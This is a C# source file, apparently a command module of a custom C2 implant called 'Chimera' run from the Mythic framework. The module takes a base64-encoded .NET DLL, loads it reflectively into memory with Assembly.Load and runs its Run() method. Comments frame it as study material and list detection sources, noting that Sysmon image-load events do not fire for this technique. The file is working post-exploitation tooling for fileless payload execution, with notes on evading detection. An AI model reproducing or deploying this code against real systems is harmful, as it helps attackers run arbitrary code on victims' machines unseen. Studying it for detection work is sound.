using System;
using System.IO;
using System.Reflection;
using System.Text;

namespace Chimera.Commands
{
    // InjectAssembly — loads a .NET DLL from a base64 blob (supplied as parameter)
    // into the current process via Assembly.Load() and calls its Run() method.
    //
    // Usage from Mythic: inject_assembly <base64_encoded_dll>
    //
    // Study notes — what this demonstrates:
    //   - Reflective in-memory execution: DLL never touches disk
    //   - Detectable via: .NET ETW events (Assembly.Load), AMSI scan on load,
    //     memory scanning for PE headers in heap
    //   - Sysmon EID 7 (ImageLoad) does NOT fire for Assembly.Load — it only
    //     fires for native DLL loads via LoadLibrary
    //   - To study detection: enable .NET ETW provider "Microsoft-Windows-DotNETRuntime"
    //     or use ProcMon with .NET activity filter
    //
    // Test DLL contract:
    //   namespace TestPayload { public class Entry { public static string Run() { return "hello"; } } }
    //   Compile: csc /target:library /out:test.dll TestPayload.cs
    //   Encode:  python -c "import base64; print(base64.b64encode(open('test.dll','rb').read()).decode())"
    public static class InjectAssembly
    {
        public static string Execute(string base64Dll)
        {
            if (string.IsNullOrEmpty(base64Dll))
                return "[error] No DLL provided. Pass base64-encoded .NET DLL as parameter.";

            try
            {
                // Decode DLL bytes
                byte[] dllBytes;
                try
                {
                    dllBytes = Convert.FromBase64String(base64Dll.Trim());
                }
                catch
                {
                    return "[error] Invalid base64. Encode your DLL with: base64 -w0 test.dll";
                }

                // Verify PE header (MZ magic bytes)
                if (dllBytes.Length < 2 || dllBytes[0] != 0x4D || dllBytes[1] != 0x5A)
                    return "[error] Input does not look like a PE file (missing MZ header).";

                // Load into current AppDomain — never written to disk
                Assembly asm = Assembly.Load(dllBytes);

                // Find a type with a static Run() method
                // Tries common entry point patterns
                string output = null;
                foreach (Type type in asm.GetTypes())
                {
                    MethodInfo run = type.GetMethod("Run",
                        BindingFlags.Public | BindingFlags.Static,
                        null,
                        Type.EmptyTypes,
                        null);

                    if (run != null)
                    {
                        object result = run.Invoke(null, null);
                        output = result != null ? result.ToString() : "(Run() returned null)";
                        break;
                    }
                }

                if (output == null)
                {
                    // List types we found so user can see what's in the DLL
                    var sb = new StringBuilder();
                    sb.AppendLine("[!] No public static Run() method found. Types in assembly:");
                    foreach (Type t in asm.GetTypes())
                        sb.AppendLine($"    {t.FullName}");
                    return sb.ToString();
                }

                return $"[+] Assembly loaded and Run() executed.\n{output}";
            }
            catch (ReflectionTypeLoadException ex)
            {
                var sb = new StringBuilder();
                sb.AppendLine("[error] Type load failed:");
                foreach (Exception le in ex.LoaderExceptions)
                    if (le != null) sb.AppendLine($"  {le.Message}");
                return sb.ToString();
            }
            catch (Exception ex)
            {
                return $"[error] {ex.GetType().Name}: {ex.Message}";
            }
        }
    }
}
